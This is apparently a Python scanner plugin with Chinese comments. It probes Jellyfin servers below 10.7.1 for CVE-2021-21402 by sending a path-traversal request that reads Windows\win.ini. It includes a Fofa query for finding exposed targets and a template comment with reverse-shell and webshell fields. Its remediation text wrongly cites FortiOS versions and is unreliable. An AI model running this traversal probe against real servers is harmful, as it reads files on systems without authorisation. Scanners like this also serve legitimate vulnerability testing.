# -*- coding: UTF-8 -*-
#!/usr/bin/python
import urllib.parse
import requests,base64
requests.packages.urllib3.disable_warnings()
def vuln_info():
    info={
        'vuln_name': '任意文件读取',  #漏洞名称
        'vuln_referer':'https://www.cnblogs.com/micr067/p/14639162.html',  #漏洞来源
        'vuln_author':'未知',  #插件作者
        'cms_name':'Jellyfin',#cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description':'''ellyfin 是一个自由的软件媒体系统，用于控制和管理媒体和流媒体。它是 emby 和 plex 的替代品，它通过多个应用程序从专用服务器向终端用户设备提供媒体。Jellyfin 属于 Emby 3.5.2 的下一代，并移植 .NET 核心框架，以支持完全的跨平台支持。

Jellyfin10.7.1版本中，攻击者恶意构造请求将允许从Jellyfin服务器的文件系统中读取任意文件。当Windows用作主机OS时，此问题更加普遍。暴露于公共Internet的服务器可能会受到威胁。在版本10.7.1中已修复此问题。解决方法是，用户可以通过在文件系统上实施严格的安全权限来限制某些访问。

影响版本：

Jellyfin<10.7.1  Fofa:title="Jellyfin"''',
        'vuln_identifier':'''CVE-2021-21402''',
        'vuln_class':'任意文件读取',#如：信息泄漏、远程命令执行、任意文件上传、SQL注入、XML注入、任意文件读取、本地文件包含、认证绕过/未认证、弱口令、目录遍历、其他、反序列化漏洞、OGNL表达式注入、SSRF、后门、任意文件下载、鉴权绕过、暴力破解、命令注入、路径泄露、XSS、远程文件包含、CSRF、任意文件包含、代码注入、任意文件写入、密码硬编码、文件包含、任意用户注册、缓冲区溢出、用户枚举漏洞、任意文件删除、任意页面上传、管理权限等
        'vuln_solution':'''修复措施：更新至FortiOS 5.6.8，6.0.5或6.2.0''',
        'FofaQuery_type':'socket', #socket、http
        'FofaQuery_link':'/web/index.html', #此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule':'title="Jellyfin" || body="http://jellyfin.media"',#header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        #header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc':1, #是否有poc  1为有 0为无
        'isexp':0  #是否有exp   1为有 0为无
    }
    return info
# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否存在，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":""}
        vuln_url =url+"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/"     
        # print(vuln_url)
        response = requests.get(vuln_url,headers=heads, verify=False,timeout=5)
        if response.status_code == 200 and "file" in response.text and "extension" in response.text and "font" in response.text:
            result['Result']= True
            result['Result_Info']= vuln_url
        else:
            result['Result_Info']= '不存在'
        return result    
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')

    # {
    #     "type":"cmd",  #cmd,shell,uploadfile
    #     "command":"whoami",  #cmd命令
    #     "reverse_ip":"127.0.0.1", #反弹shell的ip
    #     "reverse_port":"8888", #反弹shell的端口
    #     "filename":"conf.php", #写入文件的名字
    #     "filename_contents":"shell内容", #shell文件内容
    # }
# url:url   hostname：主机地址  port：端口  scheme：服务  heads:自定义请求头 
def do_exp(url,hostname,port,scheme,heads={},exp_data={},func_out=print,plugins_temp_data={}):
    try:
    # 返回参数
    #Result返回是否成功，
    #Result_Info为返回的信息，可以为Paylaod 
    #Debug debug信息 默认不会显示，勾选显示调试信息会输出此结果
    #Error_Info无论何时都会输出
        result = {"Result":False,"Result_Info":"不存在"}
        return result   # 
    except Exception as e:
        func_out('Error',str(e)+str(e.__traceback__.tb_lineno)+'行')
